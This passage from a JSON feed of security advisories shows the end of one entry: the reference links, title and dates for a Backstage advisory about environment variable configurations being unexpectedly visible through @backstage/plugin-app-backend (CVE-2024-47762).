href=\"https://github.com/backstage/backstage/security/advisories/GHSA-qc4v-xq2m-65wc\">https://github.com/backstage/backstage/security/advisories/GHSA-qc4v-xq2m-65wc</a></li>\n<li><a href=\"https://github.com/backstage/backstage/commit/323e6129073c5cb4cc106a1239eaec31a129554f\">https://github.com/backstage/backstage/commit/323e6129073c5cb4cc106a1239eaec31a129554f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47762\">https://nvd.nist.gov/vuln/detail/CVE-2024-47762</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qc4v-xq2m-65wc\">https://github.com/advisories/GHSA-qc4v-xq2m-65wc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qc4v-xq2m-65wc",
            "title": "[@backstage/plugin-app-backend] Unexpected visibility of environment variable configurations in @backstage/plugin-app-backend",
            "date_modified": "2024-10-03T18:41:12.000Z",
            "date_published": "2024-10-03T16:51:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qc4v-xq2m-65wc"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}